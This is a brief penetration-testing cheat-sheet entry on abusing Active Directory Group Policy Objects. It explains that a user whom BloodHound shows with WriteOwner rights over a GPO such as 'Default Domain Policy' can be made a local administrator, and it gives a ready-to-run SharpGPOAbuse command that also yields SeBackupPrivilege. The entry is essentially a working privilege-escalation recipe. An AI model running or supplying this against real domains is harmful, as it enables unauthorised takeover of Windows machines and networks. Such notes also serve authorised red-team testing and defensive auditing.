If bloodhound shows a user with WriteOwner perms to a policy such as "Default Domain Policy", then the GPO can be abused.

https://github.com/FSecureLABS/SharpGPOAbuse
```
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount $(USER) --GPOName "Default Domain Policy"
```
This will add them to local adminsitrators group and give them various perms (including SeBackupPrivilege!).
